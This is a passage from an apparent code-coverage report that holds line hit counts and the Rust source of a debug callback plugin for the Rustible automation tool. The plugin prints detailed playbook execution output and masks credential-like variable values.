ne":0}},{"line":551,"address":[30808130,30808578],"length":1,"stats":{"Line":0}},{"line":552,"address":[30808624,30808692],"length":1,"stats":{"Line":0}},{"line":554,"address":[30808699,30808891],"length":1,"stats":{"Line":0}},{"line":555,"address":[30810154,30808959],"length":1,"stats":{"Line":0}},{"line":556,"address":[30810240],"length":1,"stats":{"Line":0}},{"line":561,"address":[30808989],"length":1,"stats":{"Line":0}},{"line":562,"address":[30809049,30809116],"length":1,"stats":{"Line":0}},{"line":563,"address":[30809153],"length":1,"stats":{"Line":0}},{"line":565,"address":[30809378],"length":1,"stats":{"Line":0}},{"line":566,"address":[30809404],"length":1,"stats":{"Line":0}},{"line":567,"address":[30809672,30809766],"length":1,"stats":{"Line":0}},{"line":569,"address":[30809703,30809641],"length":1,"stats":{"Line":0}},{"line":572,"address":[30809740,30809847],"length":1,"stats":{"Line":0}},{"line":574,"address":[30809391,30809444],"length":1,"stats":{"Line":0}},{"line":575,"address":[30809446],"length":1,"stats":{"Line":0}},{"line":577,"address":[30809417],"length":1,"stats":{"Line":0}},{"line":579,"address":[30809481],"length":1,"stats":{"Line":0}},{"line":585,"address":[30804464,30804492,30805596,30805612,30805722,30804573,30804600],"length":1,"stats":{"Line":4}},{"line":588,"address":[30804649,30804550],"length":1,"stats":{"Line":2}},{"line":589,"address":[30804654,30804727],"length":1,"stats":{"Line":2}},{"line":590,"address":[30805655,30804837],"length":1,"stats":{"Line":2}},{"line":596,"address":[30804869],"length":1,"stats":{"Line":1}},{"line":597,"address":[30805618,30805000,30804937,30804910,30805066],"length":1,"stats":{"Line":1}},{"line":598,"address":[30805184,30805263],"length":1,"stats":{"Line":2}},{"line":599,"address":[30805275],"length":1,"stats":{"Line":1}},{"line":600,"address":[30805308],"length":1,"stats":{"Line":1}},{"line":603,"address":[30805356],"length":1,"stats":{"Line":1}},{"line":604,"address":[30805546],"length":1,"stats":{"Line":1}},{"line":608,"address":[31375963],"length":1,"stats":{"Line":0}},{"line":610,"address":[30804324,30804398],"length":1,"stats":{"Line":0}},{"line":614,"address":[30807057,30807041,30807095,30805887,30805791,30805917,30805760],"length":1,"stats":{"Line":4}},{"line":615,"address":[30805861,30805964],"length":1,"stats":{"Line":2}},{"line":618,"address":[30805980,30806048],"length":1,"stats":{"Line":2}},{"line":619,"address":[30806110,30806197],"length":1,"stats":{"Line":1}},{"line":620,"address":[30806170,30806217,30806342,30806280,30807063],"length":1,"stats":{"Line":1}},{"line":621,"address":[30806461],"length":1,"stats":{"Line":1}},{"line":625,"address":[30806494,30806638],"length":1,"stats":{"Line":1}},{"line":626,"address":[30806546,30806626],"length":1,"stats":{"Line":0}},{"line":628,"address":[30806563,30806526],"length":1,"stats":{"Line":2}},{"line":631,"address":[30806698],"length":1,"stats":{"Line":1}},{"line":638,"address":[30806079,30806886],"length":1,"stats":{"Line":2}},{"line":642,"address":[30810512,30810655,30814557,30814487,30810693,30811477,30810543],"length":1,"stats":{"Line":4}},{"line":644,"address":[30810629,30810740],"length":1,"stats":{"Line":2}},{"line":645,"address":[30810825,30810764],"length":1,"stats":{"Line":2}},{"line":648,"address":[30810926],"length":1,"stats":{"Line":1}},{"line":651,"address":[30810976,30811472,30812069],"length":1,"stats":{"Line":2}},{"line":652,"address":[30811020,30811976,30811950],"length":1,"stats":{"Line":0}},{"line":653,"address":[30812074,30812005,30811961],"length":1,"stats":{"Line":0}},{"line":654,"address":[30812042],"length":1,"stats":{"Line":0}},{"line":655,"address":[30811733,30810997,30811440],"length":1,"stats":{"Line":3}},{"line":656,"address":[30811056,30811122,30811148],"length":1,"stats":{"Line":2}},{"line":657,"address":[30811133,30811290,30811216],"length":1,"stats":{"Line":2}},{"line":660,"address":[30811261,30811316],"length":1,"stats":{"Line":2}},{"line":662,"address":[30811413],"length":1,"stats":{"Line":1}},{"line":663,"address":[30811085,30811678,30811701,30811872],"length":1,"stats":{"Line":4}},{"line":664,"address":[30811753,30811779,30811519],"length":1,"stats":{"Line":2}},{"line":665,"address":[30811877,30811764,30811808],"length":1,"stats":{"Line":2}},{"line":666,"address":[30811845],"length":1,"stats":{"Line":1}},{"line":668,"address":[30811562,30811587,30811491],"length":1,"stats":{"Line":2}},{"line":669,"address":[30811572,30811680,30811616],"length":1,"stats":{"Line":2}},{"line":670,"address":[30811651],"length":1,"stats":{"Line":1}},{"line":674,"address":[30811906,30812138],"length":1,"stats":{"Line":2}},{"line":675,"address":[30812162,30812290,30812223],"length":1,"stats":{"Line":2}},{"line":676,"address":[30812319,30812275],"length":1,"stats":{"Line":2}},{"line":677,"address":[30812347],"length":1,"stats":{"Line":1}},{"line":678,"address":[30812398],"length":1,"stats":{"Line":1}},{"line":681,"address":[30812463],"length":1,"stats":{"Line":1}},{"line":682,"address":[30812615],"length":1,"stats":{"Line":1}},{"line":683,"address":[30812760,30812683],"length":1,"stats":{"Line":2}},{"line":687,"address":[30812956,30812720],"length":1,"stats":{"Line":2}},{"line":688,"address":[30813041,30812980],"length":1,"stats":{"Line":2}},{"line":690,"address":[30813145],"length":1,"stats":{"Line":1}},{"line":691,"address":[30813168],"length":1,"stats":{"Line":1}},{"line":692,"address":[30813191],"length":1,"stats":{"Line":1}},{"line":695,"address":[30813222],"length":1,"stats":{"Line":1}},{"line":696,"address":[30813329],"length":1,"stats":{"Line":1}},{"line":708,"address":[30813553],"length":1,"stats":{"Line":1}},{"line":709,"address":[30813645],"length":1,"stats":{"Line":1}},{"line":710,"address":[30813694,30813807],"length":1,"stats":{"Line":2}},{"line":712,"address":[30813725,30813659],"length":1,"stats":{"Line":0}},{"line":718,"address":[30813244],"length":1,"stats":{"Line":1}},{"line":719,"address":[30814195],"length":1,"stats":{"Line":1}},{"line":720,"address":[30814421],"length":1,"stats":{"Line":1}},{"line":725,"address":[30817775,30817681,30817628,30817890,30817600,30818233],"length":1,"stats":{"Line":0}},{"line":726,"address":[30817673],"length":1,"stats":{"Line":0}},{"line":727,"address":[30817739,30817906],"length":1,"stats":{"Line":0}},{"line":729,"address":[30817814,30817708],"length":1,"stats":{"Line":0}},{"line":734,"address":[30814592,30814705,30814801,30814620,30814678,30815360],"length":1,"stats":{"Line":0}},{"line":735,"address":[30814670],"length":1,"stats":{"Line":0}},{"line":736,"address":[30814726],"length":1,"stats":{"Line":0}},{"line":737,"address":[30814987],"length":1,"stats":{"Line":0}},{"line":744,"address":[30814840,30814737],"length":1,"stats":{"Line":0}},{"line":759,"address":[31393776],"length":1,"stats":{"Line":1}},{"line":761,"address":[31393789],"length":1,"stats":{"Line":1}},{"line":767,"address":[31394160],"length":1,"stats":{"Line":1}},{"line":768,"address":[31394174],"length":1,"stats":{"Line":1}},{"line":769,"address":[31394180],"length":1,"stats":{"Line":1}},{"line":774,"address":[31394208],"length":1,"stats":{"Line":1}},{"line":775,"address":[31394222],"length":1,"stats":{"Line":1}},{"line":776,"address":[31394228],"length":1,"stats":{"Line":1}},{"line":781,"address":[31394256],"length":1,"stats":{"Line":1}},{"line":782,"address":[31394270],"length":1,"stats":{"Line":1}},{"line":783,"address":[31394276],"length":1,"stats":{"Line":1}},{"line":788,"address":[31393728],"length":1,"stats":{"Line":1}},{"line":789,"address":[31393736],"length":1,"stats":{"Line":1}},{"line":790,"address":[31393747],"length":1,"stats":{"Line":1}},{"line":795,"address":[31393840,31394126],"length":1,"stats":{"Line":1}},{"line":796,"address":[31393862],"length":1,"stats":{"Line":1}},{"line":799,"address":[31393898],"length":1,"stats":{"Line":1}},{"line":800,"address":[31393929,31394031],"length":1,"stats":{"Line":2}},{"line":803,"address":[31393961],"length":1,"stats":{"Line":1}}],"covered":190,"coverable":279},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","debug.rs"],"content":"//! Debug callback plugin for Rustible.\n//!\n//! This plugin provides maximum verbosity output for troubleshooting playbooks.\n//! It displays full task arguments, all variable values (with sensitive data masked),\n//! connection details, and comprehensive execution information.\n//!\n//! # Features\n//!\n//! - **Maximum Verbosity**: Shows all available information about execution\n//! - **Task Arguments**: Displays full task arguments in formatted JSON\n//! - **Variable Display**: Shows all variables with automatic sensitive data masking\n//! - **Connection Details**: Displays connection type, host, port, and encryption status\n//! - **Timing Information**: Shows precise timing for each task and overall execution\n//! - **Handler Tracking**: Shows handler notifications and executions\n//! - **Facts Display**: Shows gathered facts with optional verbosity control\n//!\n//! # Sensitive Data Masking\n//!\n//! The following patterns are automatically masked:\n//! - password, passwd, secret, token\n//! - api_key, private_key, credential\n//! - ansible_password, ansible_ssh_pass, vault_password\n//! - and more (see `SENSITIVE_PATTERNS`)\n//!\n//! # Example Output\n//!\n//! ```text\n//! ================================================================================\n//! PLAYBOOK: site.yml\n//! ================================================================================\n//!   Started: 2024-01-15 10:30:45 UTC\n//! ================================================================================\n//!\n//! ================================================================================\n//! PLAY [Configure webservers] ****************************************************\n//! ================================================================================\n//!   Hosts: 3 (web1.example.com, web2.example.com, web3.example.com)\n//!\n//! --------------------------------------------------------------------------------\n//! TASK [Install nginx package] ***************************************************\n//! --------------------------------------------------------------------------------\n//!   Host: web1.example.com\n//!\n//! [CHANGED] web1.example.com (2.345s)\n//!   Message: Package nginx installed\n//! ```\n//!\n//! # Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::DebugCallback;\n//!\n//! let callback = DebugCallback::new();\n//! // Or with custom verbosity\n//! let callback = DebugCallback::with_verbosity(3);\n//!\n//! executor.with_callback(Box::new(callback));\n//! ```\n\nuse std::collections::HashMap;\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse chrono::{DateTime, Utc};\nuse colored::Colorize;\nuse indexmap::IndexMap;\nuse serde_json::Value as JsonValue;\nuse tokio::sync::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Sensitive data patterns that should be masked in debug output.\npub const SENSITIVE_PATTERNS: \u0026[\u0026str] = \u0026[\n    \"password\",\n    \"passwd\",\n    \"secret\",\n    \"token\",\n    \"api_key\",\n    \"apikey\",\n    \"private_key\",\n    \"privatekey\",\n    \"credential\",\n    \"auth\",\n    \"bearer\",\n    \"ssh_key\",\n    \"sshkey\",\n    \"access_key\",\n    \"accesskey\",\n    \"secret_key\",\n    \"secretkey\",\n    \"encryption_key\",\n    \"vault_password\",\n    \"become_pass\",\n    \"ansible_password\",\n    \"ansible_become_pass\",\n    \"ansible_ssh_pass\",\n];\n\n/// Mask value used for sensitive data.\npub const MASKED_VALUE: \u0026str = \"********\";\n\n/// Configuration for the debug callback.\n#[derive(Debug, Clone, PartialEq)]\npub struct DebugConfig {\n    /// Verbosity level (0-5)\n    pub verbosity: u8,\n    /// Whether to mask sensitive data\n    pub mask_sensitive: bool,\n    /// Whether to show timestamps\n    pub show_timestamps: bool,\n    /// Whether to show task arguments\n    pub show_task_args: bool,\n    /// Whether to show all facts\n    pub show_all_facts: bool,\n    /// Custom sensitive patterns to mask (in addition to defaults)\n    pub custom_sensitive_patterns: Vec\u003cString\u003e,\n}\n\nimpl Default for DebugConfig {\n    fn default() -\u003e Self {\n        Self {\n            verbosity: 5,\n            mask_sensitive: true,\n            show_timestamps: true,\n            show_task_args: true,\n            show_all_facts: false,\n            custom_sensitive_patterns: Vec::new(),\n        }\n    }\n}\n\nimpl DebugConfig {\n    /// Create a new configuration with default settings.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set the verbosity level (0-5).\n    #[must_use]\n    pub fn with_verbosity(mut self, level: u8) -\u003e Self {\n        self.verbosity = level.min(5);\n        self\n    }\n\n    /// Set whether to mask sensitive data.\n    #[must_use]\n    pub fn with_mask_sensitive(mut self, mask: bool) -\u003e Self {\n        self.mask_sensitive = mask;\n        self\n    }\n\n    /// Set whether to show timestamps.\n    #[must_use]\n    pub fn with_timestamps(mut self, show: bool) -\u003e Self {\n        self.show_timestamps = show;\n        self\n    }\n\n    /// Set whether to show task arguments.\n    #[must_use]\n    pub fn with_task_args(mut self, show: bool) -\u003e Self {\n        self.show_task_args = show;\n        self\n    }\n\n    /// Set whether to show all facts.\n    #[must_use]\n    pub fn with_all_facts(mut self, show: bool) -\u003e Self {\n        self.show_all_facts = show;\n        self\n    }\n\n    /// Add custom sensitive patterns to mask.\n    #[must_use]\n    pub fn with_sensitive_patterns(mut self, patterns: Vec\u003cString\u003e) -\u003e Self {\n        self.custom_sensitive_patterns = patterns;\n        self\n    }\n}\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Total execution time for this host\n    total_duration: Duration,\n}\n\n/// Debug callback plugin for maximum verbosity troubleshooting.\n///\n/// This callback displays comprehensive information about every aspect\n/// of playbook execution, making it ideal for debugging complex playbooks\n/// or understanding Rustible's behavior.\n///\n/// # Design Principles\n///\n/// 1. **Comprehensive Output**: Show everything that might be relevant\n/// 2. **Structured Display**: Use clear visual hierarchy with separators\n/// 3. **Sensitive Data Protection**: Automatically mask secrets and credentials\n/// 4. **Timing Precision**: Show millisecond-precision timing for profiling\n///\n/// # Verbosity Levels\n///\n/// - 0: Quiet - only errors\n/// - 1: Normal - basic progress (play/task headers)\n/// - 2: Verbose - task details and results\n/// - 3: More verbose - arguments and full results\n/// - 4: Debug - variables and connection info\n/// - 5: Maximum - everything including all facts\n#[derive(Debug)]\npub struct DebugCallback {\n    /// Configuration\n    config: Arc\u003cRwLock\u003cDebugConfig\u003e\u003e,\n    /// Per-host execution statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Playbook start time\n    playbook_start: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Task start times per host\n    task_start_times: Arc\u003cRwLock\u003cHashMap\u003cString, Instant\u003e\u003e\u003e,\n    /// Whether any failures occurred\n    has_failures: Arc\u003cRwLock\u003cbool\u003e\u003e,\n    /// Variables for display (may be set externally)\n    variables: Arc\u003cRwLock\u003cIndexMap\u003cString, JsonValue\u003e\u003e\u003e,\n    /// Task arguments for display (may be set externally)\n    task_args: Arc\u003cRwLock\u003cIndexMap\u003cString, JsonValue\u003e\u003e\u003e,\n}\n\nimpl DebugCallback {\n    /// Creates a new debug callback with default settings.\n    ///\n    /// Default verbosity is 5 (maximum).\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = DebugCallback::new();\n    /// ```\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self::with_config(DebugConfig::default())\n    }\n\n    /// Creates a debug callback with a specific configuration.\n    #[must_use]\n    pub fn with_config(config: DebugConfig) -\u003e Self {\n        Self {\n            config: Arc::new(RwLock::new(config)),\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            playbook_start: Arc::new(RwLock::new(None)),\n            playbook_name: Arc::new(RwLock::new(None)),\n            task_start_times: Arc::new(RwLock::new(HashMap::new())),\n            has_failures: Arc::new(RwLock::new(false)),\n            variables: Arc::new(RwLock::new(IndexMap::new())),\n            task_args: Arc::new(RwLock::new(IndexMap::new())),\n        }\n    }\n\n    /// Creates a debug callback with a specific verbosity level.\n    ///\n    /// # Arguments\n    ///\n    /// * `verbosity` - Verbosity level from 0 (quiet) to 5 (maximum)\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = DebugCallback::with_verbosity(3);\n    /// ```\n    #[must_use]\n    pub fn with_verbosity(verbosity: u8) -\u003e Self {\n        Self::with_config(DebugConfig::default().with_verbosity(verbosity))\n    }\n\n    /// Returns whether any failures occurred during execution.\n    pub async fn has_failures(\u0026self) -\u003e bool {\n        *self.has_failures.read().await\n    }\n\n    /// Gets the current verbosity level.\n    pub async fn verbosity(\u0026self) -\u003e u8 {\n        self.config.read().await.verbosity\n    }\n\n    /// Sets the verbosity level.\n    pub async fn set_verbosity(\u0026self, level: u8) {\n        self.config.write().await.verbosity = level.min(5);\n    }\n\n    /// Sets variables for display in debug output.\n    pub async fn set_variables(\u0026self, vars: IndexMap\u003cString, JsonValue\u003e) {\n        *self.variables.write().await = vars;\n    }\n\n    /// Sets task arguments for display in debug output.\n    pub async fn set_task_args(\u0026self, args: IndexMap\u003cString, JsonValue\u003e) {\n        *self.task_args.write().await = args;\n    }\n\n    /// Masks sensitive data in a JSON value.\n    fn mask_value(value: \u0026JsonValue) -\u003e JsonValue {\n        match value {\n            JsonValue::Object(map) =\u003e {\n                let mut new_map = serde_json::Map::new();\n                for (key, val) in map {\n                    let key_lower = key.to_lowercase();\n                    let is_sensitive = SENSITIVE_PATTERNS\n                        .iter()\n                        .any(|pattern| key_lower.contains(*pattern));\n\n                    if is_sensitive {\n                        new_map.insert(key.clone(), JsonValue::String(MASKED_VALUE.to_string()));\n                    } else {\n                        new_map.insert(key.clone(), Self::mask_value(val));\n                    }\n                }\n                JsonValue::Object(new_map)\n            }\n            JsonValue::Array(arr) =\u003e JsonValue::Array(arr.iter().map(Self::mask_value).collect()),\n            _ =\u003e value.clone(),\n        }\n    }\n\n    /// Formats a JSON value for display, optionally masking sensitive data.\n    fn format_json(value: \u0026JsonValue, mask: bool, indent: usize) -\u003e String {\n        let value = if mask {\n            Self::mask_value(value)\n        } else {\n            value.clone()\n        };\n\n        serde_json::to_string_pretty(\u0026value)\n            .unwrap_or_else(|_| format!(\"{:?}\", value))\n            .lines()\n            .map(|line| format!(\"{:indent$}{}\", \"\", line, indent = indent))\n            .collect::\u003cVec\u003c_\u003e\u003e()\n            .join(\"\\n\")\n    }\n\n    /// Formats a duration in human-readable form.\n    fn format_duration(duration: Duration) -\u003e String {\n        let secs = duration.as_secs();\n        let millis = duration.subsec_millis();\n\n        if secs \u003e= 3600 {\n            let hours = secs / 3600;\n            let mins = (secs % 3600) / 60;\n            let secs_rem = secs % 60;\n            format!(\"{}h {:02}m {:02}s\", hours, mins, secs_rem)\n        } else if secs \u003e= 60 {\n            let mins = secs / 60;\n            let secs_rem = secs % 60;\n            format!(\"{}m {:02}s\", mins, secs_rem)\n        } else if secs \u003e 0 {\n            format!(\"{}.{:03}s\", secs, millis)\n        } else {\n            format!(\"{}ms\", millis)\n        }\n    }\n\n    /// Formats the current timestamp.\n    fn format_timestamp() -\u003e String {\n        let now: DateTime\u003cUtc\u003e = Utc::now();\n        now.format(\"%Y-%m-%d %H:%M:%S%.3f UTC\").to_string()\n    }\n\n    /// Prints a separator line.\n    fn print_separator(char: char, width: usize) {\n        println!(\"{}\", char.to_string().repeat(width).bright_black());\n    }\n\n    /// Prints a major separator (for playbooks and plays).\n    fn print_major_separator() {\n        Self::print_separator('=', 80);\n    }\n\n    /// Prints a minor separator (for tasks).\n    fn print_minor_separator() {\n        Self::print_separator('-', 80);\n    }\n\n    /// Prints indented key-value pair.\n    fn print_kv(key: \u0026str, value: \u0026str, indent: usize) {\n        println!(\"{:indent$}{}: {}\", \"\", key.cyan(), value, indent = indent);\n    }\n\n    /// Prints task result status with color.\n    fn print_status(status: \u0026str, host: \u0026str, duration: Duration, msg: Option\u003c\u0026str\u003e) {\n        let duration_str = Self::format_duration(duration);\n        let status_colored = match status.to_lowercase().as_str() {\n            \"ok\" =\u003e format!(\"[{}]\", \"OK\".green().bold()),\n            \"changed\" =\u003e format!(\"[{}]\", \"CHANGED\".yellow().bold()),\n            \"failed\" =\u003e format!(\"[{}]\", \"FAILED\".red().bold()),\n            \"skipped\" =\u003e format!(\"[{}]\", \"SKIPPED\".cyan().bold()),\n            \"unreachable\" =\u003e format!(\"[{}]\", \"UNREACHABLE\".magenta().bold()),\n            _ =\u003e format!(\"[{}]\", status.bright_white().bold()),\n        };\n\n        print!(\n            \"{} {} ({})\",\n            status_colored,\n            host.bright_white().bold(),\n            duration_str.bright_black()\n        );\n\n        if let Some(message) = msg {\n            println!();\n            println!(\"  {}: {}\", \"Message\".cyan(), message);\n        } else {\n            println!();\n        }\n    }\n}\n\nimpl Default for DebugCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for DebugCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: Arc::clone(\u0026self.config),\n            host_stats: Arc::clone(\u0026self.host_stats),\n            playbook_start: Arc::clone(\u0026self.playbook_start),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            task_start_times: Arc::clone(\u0026self.task_start_times),\n            has_failures: Arc::clone(\u0026self.has_failures),\n            variables: Arc::clone(\u0026self.variables),\n            task_args: Arc::clone(\u0026self.task_args),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for DebugCallback {\n    /// Called when a playbook starts - displays playbook header with full details.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let config = self.config.read().await;\n        let verbosity = config.verbosity;\n\n        // Record start time\n        *self.playbook_start.write().await = Some(Instant::now());\n        *self.playbook_name.write().await = Some(name.to_string());\n\n        // Clear stats from any previous run\n        self.host_stats.write().await.clear();\n        *self.has_failures.write().await = false;\n\n        if verbosity \u003e= 1 {\n            println!();\n            Self::print_major_separator();\n            println!(\n                \"{} {}\",\n                \"PLAYBOOK:\".bright_white().bold(),\n                name.yellow().bold()\n            );\n            Self::print_major_separator();\n\n            if verbosity \u003e= 2 \u0026\u0026 config.show_timestamps {\n                Self::print_kv(\"Started\", \u0026Self::format_timestamp(), 2);\n            }\n\n            Self::print_major_separator();\n            println!();\n        }\n    }\n\n    /// Called when a playbook ends - displays comprehensive recap.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let config = self.config.read().await;\n        let verbosity = config.verbosity;\n        let stats = self.host_stats.read().await;\n        let start = self.playbook_start.read().await;\n\n        if verbosity \u003e= 1 {\n            println!();\n            Self::print_major_separator();\n            println!(\n                \"{} {}\",\n                \"PLAY RECAP\".bright_white().bold(),\n                \"*\".repeat(69).bright_black()\n            );\n            Self::print_major_separator();\n\n            // Print detailed stats for each host\n            let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n            hosts.sort();\n\n            for host in hosts {\n                if let Some(host_stats) = stats.get(host) {\n                    let host_color = if host_stats.failed \u003e 0 {\n                        host.red().bold()\n                    } else if host_stats.changed \u003e 0 {\n                        host.yellow()\n                    } else {\n                        host.green()\n                    };\n\n                    println!(\n                        \"{:\u003c30} : {}={:\u003c4} {}={:\u003c4} {}={:\u003c4} {}={:\u003c4}\",\n                        host_color,\n                        \"ok\".green(),\n                        host_stats.ok,\n                        \"changed\".yellow(),\n                        host_stats.changed,\n                        \"failed\".red(),\n                        host_stats.failed,\n                        \"skipped\".cyan(),\n                        host_stats.skipped,\n                    );\n\n                    if verbosity \u003e= 3 {\n                        println!(\n                            \"{:32}  {}: {}\",\n                            \"\",\n                            \"total time\".bright_black(),\n                            Self::format_duration(host_stats.total_duration).bright_black()\n                        );\n                    }\n                }\n            }\n\n            // Print overall summary\n            if let Some(start_time) = *start {\n                let duration = start_time.elapsed();\n                let status = if success {\n                    \"completed successfully\".green().bold()\n                } else {\n                    \"failed\".red().bold()\n                };\n\n                println!();\n                Self::print_major_separator();\n                println!(\n                    \"{} {} in {}\",\n                    \"Playbook\".bright_white(),\n                    status,\n                    Self::format_duration(duration).yellow()\n                );\n\n                if verbosity \u003e= 2 \u0026\u0026 config.show_timestamps {\n                    Self::print_kv(\"Finished\", \u0026Self::format_timestamp(), 2);\n                }\n\n                Self::print_major_separator();\n            }\n\n            println!();\n        }\n\n        let _ = name;\n    }\n\n    /// Called when a play starts - displays play header with host list.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        let config = self.config.read().await;\n        let verbosity = config.verbosity;\n\n        // Initialize stats for all hosts in this play\n        {\n            let mut stats = self.host_stats.write().await;\n            for host in hosts {\n                stats.entry(host.clone()).or_default();\n            }\n        }\n\n        if verbosity \u003e= 1 {\n            println!();\n            Self::print_major_separator();\n            println!(\n                \"{} [{}] {}\",\n                \"PLAY\".bright_white().bold(),\n                name.yellow().bold(),\n                \"*\".repeat(70_usize.saturating_sub(name.len() + 8))\n                    .bright_black()\n            );\n            Self::print_major_separator();\n\n            if verbosity \u003e= 2 {\n                // Show host information\n                let host_list = if hosts.len() \u003c= 5 {\n                    hosts.join(\", \")\n                } else {\n                    format!(\n                        \"{}, ... and {} more\",\n                        hosts[..5].join(\", \"),\n                        hosts.len() - 5\n                    )\n                };\n                Self::print_kv(\"Hosts\", \u0026format!(\"{} ({})\", hosts.len(), host_list), 2);\n\n                // Show variables at high verbosity\n                if verbosity \u003e= 4 {\n                    let vars = self.variables.read().await;\n                    if !vars.is_empty() {\n                        println!(\"  {}:\", \"Variables\".cyan());\n                        for (key, value) in vars.iter() {\n                            let formatted = Self::format_json(value, config.mask_sensitive, 6);\n                            println!(\"    {}: {}\", key.bright_white(), formatted.trim());\n                        }\n                    }\n                }\n            }\n\n            println!();\n        }\n    }\n\n    /// Called when a play ends.\n    async fn on_play_end(\u0026self, name: \u0026str, success: bool) {\n        let config = self.config.read().await;\n        let verbosity = config.verbosity;\n\n        if verbosity \u003e= 2 {\n            let status = if success {\n                \"completed\".green()\n            } else {\n                \"failed\".red().bold()\n            };\n            println!(\n                \"\\n{} [{}] {}\",\n                \"PLAY END:\".bright_black(),\n                name.bright_white(),\n                status\n            );\n        }\n    }\n\n    /// Called when a task starts - displays task header with full arguments.\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        let config = self.config.read().await;\n        let verbosity = config.verbosity;\n\n        // Record task start time for this host\n        self.task_start_times\n            .write()\n            .await\n            .insert(host.to_string(), Instant::now());\n\n        if verbosity \u003e= 1 {\n            Self::print_minor_separator();\n            println!(\n                \"{} [{}] {}\",\n                \"TASK\".bright_white().bold(),\n                name.yellow().bold(),\n                \"*\".repeat(70_usize.saturating_sub(name.len() + 8))\n                    .bright_black()\n            );\n            Self::print_minor_separator();\n        }\n\n        if verbosity \u003e= 2 {\n            Self::print_kv(\"Host\", host, 2);\n\n            // Show task arguments at verbosity 3+\n            if verbosity \u003e= 3 \u0026\u0026 config.show_task_args {\n                let args = self.task_args.read().await;\n                if !args.is_empty() {\n                    println!(\"  {}:\", \"Arguments\".cyan());\n                    let args_json = serde_json::to_value(args.clone()).unwrap_or(JsonValue::Null);\n                    let formatted = Self::format_json(\u0026args_json, config.mask_sensitive, 4);\n                    println!(\"{}\", formatted);\n                }\n            }\n\n            println!();\n        }\n    }\n\n    /// Called when a task completes - displays result with full details.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let config = self.config.read().await;\n        let verbosity = config.verbosity;\n\n        // Update stats\n        {\n            let mut stats = self.host_stats.write().await;\n            let host_stats = stats.entry(result.host.clone()).or_default();\n            host_stats.total_duration += result.duration;\n\n            if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if !result.result.success {\n                host_stats.failed += 1;\n                *self.has_failures.write().await = true;\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n        }\n\n        // Determine status\n        let status = if result.result.skipped {\n            \"skipped\"\n        } else if !result.result.success {\n            \"failed\"\n        } else if result.result.changed {\n            \"changed\"\n        } else {\n            \"ok\"\n        };\n\n        if verbosity \u003e= 1 {\n            // Get actual duration from our recorded start time if available\n            let duration = {\n                let start_times = self.task_start_times.read().await;\n                start_times\n                    .get(\u0026result.host)\n                    .map(|start| start.elapsed())\n                    .unwrap_or(result.duration)\n            };\n\n            // Show status line\n            let msg = if !result.result.success || result.result.changed || result.result.skipped {\n                Some(result.result.message.as_str())\n            } else {\n                None\n            };\n\n            Self::print_status(status, \u0026result.host, duration, msg);\n\n            // Show result details at verbosity 3+\n            if verbosity \u003e= 3 {\n                // Show result data if available\n                if let Some(ref data) = result.result.data {\n                    println!(\"  {}:\", \"Result\".cyan());\n                    let formatted = Self::format_json(data, config.mask_sensitive, 4);\n                    println!(\"{}\", formatted);\n                }\n\n                // Show warnings\n                if !result.result.warnings.is_empty() {\n                    for warning in \u0026result.result.warnings {\n                        println!(\"  {}: {}\", \"WARNING\".yellow().bold(), warning);\n                    }\n                }\n\n                // Show notify handlers that were triggered\n                if !result.notify.is_empty() {\n                    println!(\n                        \"  {}: {}\",\n                        \"Notified\".cyan(),\n                        result.notify.join(\", \").bright_white()\n                    );\n                }\n            }\n\n            println!();\n        }\n    }\n\n    /// Called when a handler is triggered.\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        let config = self.config.read().await;\n        let verbosity = config.verbosity;\n\n        if verbosity \u003e= 2 {\n            println!(\"  {} {}\", \"HANDLER NOTIFIED:\".bright_black(), name.yellow());\n        }\n    }\n\n    /// Called when facts are gathered - displays all facts at high verbosity.\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        let config = self.config.read().await;\n        let verbosity = config.verbosity;\n\n        if verbosity \u003e= 3 {\n            Self::print_minor_separator();\n            println!(\n                \"{} [{}] {}\",\n                \"GATHERING FACTS\".bright_white().bold(),\n                host.yellow().bold(),\n                \"*\".repeat(55).bright_black()\n            );\n            Self::print_minor_separator();\n\n            let all_facts = facts.all();\n            Self::print_kv(\"Facts gathered\", \u0026format!(\"{} items\", all_facts.len()), 2);\n\n            // Show all facts at verbosity 5\n            if verbosity \u003e= 5 \u0026\u0026 config.show_all_facts {\n                println!(\"  {}:\", \"All Facts\".cyan());\n                let facts_json = serde_json::to_value(all_facts).unwrap_or(JsonValue::Null);\n                let formatted = Self::format_json(\u0026facts_json, config.mask_sensitive, 4);\n                println!(\"{}\", 